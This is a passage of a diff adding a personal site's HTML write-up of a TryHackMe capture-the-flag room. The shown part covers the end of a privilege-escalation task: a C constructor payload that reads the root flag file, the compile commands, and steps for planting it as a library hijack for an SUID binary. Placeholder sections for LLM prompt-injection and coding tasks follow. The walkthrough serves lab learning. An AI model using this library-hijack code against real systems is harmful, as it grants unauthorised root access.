+    setgid(0);
+    system("id &gt; /tmp/root_pwn; "
+           "cat /root/root.txt &gt;&gt; /tmp/root_pwn; "
+           "chmod 666 /tmp/root_pwn");
+}
+
+__attribute__((constructor))
+void ctor(void) { run(); }</code></pre>
+
+                    <p>The compile gotcha. The box ships <code>gcc-13</code> and all the tools in <code>/usr/libexec/gcc/x86_64-linux-gnu/13/</code>, but the Apache child environment that executes your uploaded ELF has an <em>empty PATH</em>. The gcc wrapper's <code>execvp("cc1", ...)</code> fails with <code>No such file or directory</code> because <code>cc1</code> isn't in the (empty) PATH and the default search paths don't include <code>/usr/libexec</code>. Fix by passing both <code>-B</code> dirs explicitly and exporting a sane PATH for the linker's own child processes:</p>
+                    <pre><code>export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+gcc -B/usr/libexec/gcc/x86_64-linux-gnu/13/ \
+    -B/usr/bin/ \
+    -shared -fPIC \
+    -o /tmp/libscan.so /tmp/libscan.c</code></pre>
+
+                    <p>Then plant and trigger:</p>
+                    <pre><code>cp /tmp/libscan.so /opt/agent/libscan.so
+chmod 755 /opt/agent/libscan.so
+/opt/agent/scanner        # SUID root loads our .so, constructor runs as root
+cat /tmp/root_pwn
+# =&gt; uid=0(root) gid=0(root) groups=0(root),33(www-data)
+# =&gt; root flag text</code></pre>
+
+                    <p>All of that bundles into a single msfvenom <code>CMD=</code> payload if you want it as one upload.</p>
+
+                    <div class="takeaway"><strong>Takeaway.</strong> A "sandbox" that advertises <em>"passed YARA and was emulated"</em> while actually executing the binary and streaming its stdout back is a free <code>system()</code> as the server user. And an SUID binary that <code>dlopen</code>s a sibling path in a world-writable directory doesn't even need to be overwritten &mdash; the missing library is the hijack.</div>
+
+                    <p><strong>Flag formats:</strong> user <code>THM{REDACTED}</code>, root <code>THM{REDACTED}</code> &mdash; actual values <span class="redacted">redacted per TryHackMe policy</span>.</p>
+                </article>
+
+                <!-- ============= TASK 8 ============= -->
+                <article class="task" id="task-8">
+                    <div class="task-head">
+                        <span class="task-num">Task 08</span>
+                        <span class="cat cat-llm">LLM</span>
+                        <h3>HelloGPT</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. Prompt-injection / system-prompt leak? -->
+                    <div class="pending-note">Writeup pending. Add the prompt the model protected, the injection payload that leaked it, and whether the solve hinged on role-play framing, context-stuffing, or a tool-call escape.</div>
+                </article>
+
+                <!-- ============= TASK 9 ============= -->
+                <article class="task" id="task-9">
+                    <div class="task-head">
+                        <span class="task-num">Task 09</span>
+                        <span class="cat cat-llm">LLM</span>
+                        <h3>BankGPT</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. -->
+                    <div class="pending-note">Writeup pending. Add the model's authorised actions, the privilege the attack had to cross (likely account/role-scope), and the exact chat turns that produced the flag.</div>
+                </article>
+
+                <!-- ============= TASK 10 ============= -->
+                <article class="task" id="task-10">
+                    <div class="task-head">
+                        <span class="task-num">Task 10</span>
+                        <span class="cat cat-code">Coding</span>
+                        <h3>Math Wiz</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
+                    <div class="pending-note">Writeup pending. Add the task input shape, the algorithm/edge case that mattered, and the final solution script.</div>
+                </article>
+
+                <!-- ============= TASK 11 ============= -->
+                <article class="task" id="task-11">
+                    <div class="task-head">
+                        <span class="task-num">Task 11</span>
+                        <span class="cat cat-code">Coding</span>
+                        <h3>Exposed</h3>
+                    </div>
+                    <!-- TODO Pushpender: fill from your own notes. Region = Europe (Ireland) required. -->
+                    <div class="pending-note">Writeup pending. Add the exposed data-source, the parsing that extracted the flag, and your solution script.</div>
+                </article>
+
+                <div class="footer-note">
+                    <p>Room link: <a href="https://tryhackme.com/room/dehlimeetup" target="_blank" rel="noopener noreferrer">tryhackme.com/room/dehlimeetup</a>. Hosted at the TryHackMe x EHAX workshop at Delhi Technological University on 2026-10-13.</p>
+                    <p>Flags are deliberately redacted per <a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">TryHackMe</a>'s writeup rules. If you need the actual flag strings to validate your own solve, run the room yourself; the techniques here reproduce them.</p>
+                </div>
+
+            </div>
+        </section>
+    </main>
+
+    <footer style="padding: 2rem 0 2.5rem; border-top: 1px solid var(--glass-border); margin-top: 2rem;">
+        <div class="container" style="text-align: center; color: var(--text-muted); font-size: 0.9rem;">
+            <p>&copy; 2026 Pushpender Singh Rathore &middot; <a href="../index.html" style="color: var(--accent-secondary);">pushpenderrathore.github.io</a></p>
+        </div>
+    </footer>
+</body>
+</html>
